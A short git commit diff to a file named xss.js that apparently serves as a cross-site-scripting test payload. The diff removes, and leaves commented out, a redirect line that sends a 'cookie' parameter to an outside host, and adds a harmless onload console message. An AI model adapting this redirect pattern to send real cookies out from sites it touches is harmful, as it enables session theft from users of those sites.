dbfcb5e6113c4484cc95f5556fd22e16a9a36afc
Jakob Zudrell <jakob@zudrell.eu>
2025-11-09 10:18:23 +0100

    update script

--- xss.js
+++ xss.js
@@ -1,2 +1,5 @@
-console.log("hello world")
-window.location="https://zudrell.eu/xss?&cookie=hello-world"
+window.onload = function(){
+    console.log("hello world")
+};  
+
+// window.location="https://zudrell.eu/xss?&cookie=hello-world"
